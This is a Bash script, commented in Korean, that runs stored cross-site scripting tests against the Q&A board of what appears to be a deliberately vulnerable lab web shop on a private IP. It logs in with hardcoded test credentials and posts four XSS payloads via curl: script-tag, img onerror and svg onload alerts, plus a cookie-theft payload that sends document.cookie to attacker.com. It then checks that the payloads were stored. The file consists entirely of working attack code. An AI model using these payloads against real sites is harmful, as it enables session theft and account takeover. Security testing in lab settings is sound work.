#!/bin/bash
# XSS 취약점 테스트 스크립트
# 타겟: VULN SHOP Q&A 게시판

TARGET="http://192.168.0.28:3000/board"
COOKIES="/tmp/cookies.txt"

echo "=== XSS 취약점 테스트 ==="
echo "타겟: $TARGET"
echo ""

# 로그인 먼저 수행
echo "[준비] 로그인 수행..."
curl -s -X POST "http://192.168.0.28:3000/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=testuser456&password=test456" \
  -c "$COOKIES" > /dev/null
echo ""

# 테스트 1: 기본 script 태그
echo "[테스트 1] <script> 태그 XSS"
curl -s -X POST "$TARGET" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "content=<script>alert('XSS-Test1')</script>" \
  -b "$COOKIES"
echo ""

# 테스트 2: img onerror
echo "[테스트 2] <img onerror> XSS"
curl -s -X POST "$TARGET" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "content=<img src=x onerror=alert('XSS-Test2')>" \
  -b "$COOKIES"
echo ""

# 테스트 3: svg onload
echo "[테스트 3] <svg onload> XSS"
curl -s -X POST "$TARGET" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "content=<svg onload=alert('XSS-Test3')>" \
  -b "$COOKIES"
echo ""

# 테스트 4: 쿠키 탈취 시뮬레이션
echo "[테스트 4] 쿠키 탈취 페이로드"
curl -s -X POST "$TARGET" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "content=<script>document.location='http://attacker.com/steal?c='+document.cookie</script>" \
  -b "$COOKIES"
echo ""

# 결과 확인
echo "=== 저장된 XSS 페이로드 확인 ==="
curl -s "$TARGET" -b "$COOKIES" | grep -E "(<script|<img|<svg)" | head -10
